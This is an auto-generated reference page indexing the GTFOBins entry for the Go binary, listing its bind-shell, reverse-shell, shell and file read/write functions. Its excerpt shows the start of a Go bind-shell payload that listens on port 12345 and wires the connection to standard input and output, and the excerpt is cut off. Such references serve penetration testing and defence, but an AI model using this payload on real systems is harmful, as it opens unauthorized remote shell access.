---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# go

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `go` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/go` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for go covering bind-shell, file-read, file-write, reverse-shell, shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/go.md)
- Source verification: [source record](../../sources/gtfobins/go.md)

## Aliases

- `go`

## Source Verification

[source record](../../sources/gtfobins/go.md)

## Evidence Excerpt

```text
_body: ''
_name: go
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/go
functions:
bind-shell:
- code: 'echo -e ''package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET,
syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd,
addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd,
```
